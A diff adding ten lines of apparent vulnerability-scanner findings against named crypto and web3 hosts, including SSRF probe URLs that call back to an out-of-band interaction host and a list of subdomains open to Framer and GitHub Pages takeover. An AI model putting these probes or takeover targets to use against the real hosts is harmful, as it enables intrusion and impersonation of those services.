@@ -1,0 +1,10 @@
+[CVE-2015-8813] [http] [high] https://web-screenshot-api.b3.fun/Umbraco/feedproxy.aspx?url=http://d9ltspslr2r3dqttlkc0jdgc8kiksiayp.oast.fun
+[CVE-2017-18638] [http] [high] https://web-screenshot-api.b3.fun/composer/send_email?to=EGNo@cShI&url=http://d9ltspslr2r3dqttlkc081e9kw77pdyzj.oast.fun
+[CVE-2025-55184] [http] [high] https://rome.rivalz.ai/dex
+[framer-takeover] [http] [high] https://gamechain.b3.fun ["sites.framer.app"]
+[framer-takeover] [http] [high] https://onchainsummit.mellow.finance ["forgiving-pentagon-079979.framer.app"]
+[github-takeover] [http] [high] https://claim-proofs.elixir.xyz
+[github-takeover] [http] [high] https://github-test.orderly.network ["orderlynetwork.github.io"]
+[github-takeover] [http] [high] https://partnerclaims.elixir.xyz ["partnerclaims.github.io"]
+[github-takeover] [http] [high] https://staging-dex.orderly.network ["orderlynetwork.github.io"]
+[github-takeover] [http] [high] https://testnet-dex.orderly.network ["orderlynetworkdexcreatorstaging.github.io"]
